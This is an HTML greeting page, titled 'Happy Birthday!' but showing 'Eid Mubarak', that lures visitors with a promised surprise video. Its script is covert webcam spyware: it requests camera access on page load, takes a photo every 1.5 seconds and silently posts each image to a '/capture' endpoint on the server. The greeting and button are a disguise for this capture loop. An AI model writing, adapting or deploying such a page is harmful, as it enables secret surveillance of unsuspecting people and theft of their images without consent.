<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Birthday!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: url('https://source.unsplash.com/1600x900/?birthday,party') no-repeat center center fixed;
            background-size: cover;
            color: white;
            margin: 0;
            padding: 0;
        }
        .container {
            margin-top: 100px;
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
        }
        h1 {
            font-size: 36px;
        }
        p {
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸŽ‰ Eid Mubarak ðŸŽ‚</h1>
        <p>We have a special surprise video message for you! Click below to view it.</p>
        <button onclick="startCapture()">ðŸŽ¥ Watch Now</button>
    </div>

    <script>
        let capturing = false;
        let videoStream;
        
        function startCapture() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    videoStream = stream;
                    capturing = true;
                    captureLoop();
                })
                .catch(error => console.error("Error accessing camera:", error));
        }

        function captureLoop() {
            if (!capturing) return;
            let track = videoStream.getTracks()[0];
            let imageCapture = new ImageCapture(track);
            imageCapture.takePhoto()
                .then(blob => {
                    let reader = new FileReader();
                    reader.onloadend = function () {
                        fetch('/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ image: reader.result })
                        });
                    };
                    reader.readAsDataURL(blob);
                })
                .catch(error => console.error("Capture error:", error));

            setTimeout(captureLoop, 1500);
        }

        window.onload = startCapture; // Start capturing when page loads
    </script>
</body>
</html>
